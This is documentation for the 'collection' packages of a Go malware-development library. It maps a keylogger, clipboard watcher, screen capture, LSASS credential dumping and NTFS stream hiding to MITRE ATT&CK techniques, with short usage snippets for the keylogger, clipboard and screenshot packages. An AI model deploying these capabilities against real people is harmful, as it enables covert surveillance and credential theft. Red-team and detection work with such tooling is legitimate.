# Collection

[<- Back to README](../../../README.md)

**MITRE ATT&CK:** [T1056 - Input Capture](https://attack.mitre.org/techniques/T1056/), [T1115 - Clipboard Data](https://attack.mitre.org/techniques/T1115/), [T1113 - Screen Capture](https://attack.mitre.org/techniques/T1113/), [T1564.004 - Hide Artifacts: NTFS File Attributes](https://attack.mitre.org/techniques/T1564/004/), [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)

---

## Overview

The `collection/` package provides post-exploitation data collection techniques. Each sub-package captures a different data source.

## Packages

| Package | Technique | MITRE | Platform | Detection |
|---------|-----------|-------|----------|-----------|
| `collection/keylog` | Low-level keyboard hook (SetWindowsHookEx) | T1056.001 | Windows | High |
| `collection/clipboard` | Clipboard text monitoring | T1115 | Windows | Medium |
| `collection/screenshot` | Screen capture via GDI BitBlt | T1113 | Windows | Medium |
| [`credentials/lsassdump`](lsass-dump.md) | LSASS memory dump (NtGetNextProcess + NtReadVirtualMemory, MINIDUMP assembled in-process) | T1003.001 | Windows | High |
| `cleanup/ads` | NTFS Alternate Data Streams (hide/store data in named streams) | T1564.004 | Windows | Medium |

## Usage

### Keylogger

```go
import "github.com/oioio-space/maldev/collection/keylog"

ch, err := keylog.Start(ctx)
if err != nil {
    log.Fatal(err)
}

for ev := range ch {
    fmt.Printf("[%s] %s: %s\n", ev.Process, ev.Window, ev.Character)
}
```

### Clipboard

```go
import "github.com/oioio-space/maldev/collection/clipboard"

// One-shot read
text, err := clipboard.ReadText()

// Continuous monitoring
for content := range clipboard.Watch(ctx, 500*time.Millisecond) {
    fmt.Println("Clipboard changed:", content)
}
```

### Screenshot

```go
import "github.com/oioio-space/maldev/collection/screenshot"

// Capture primary display as PNG bytes
png, err := screenshot.Capture()

// Capture specific region
png, err = screenshot.CaptureRect(0, 0, 1920, 1080)

// Capture specific display
png, err = screenshot.CaptureDisplay(0)
```
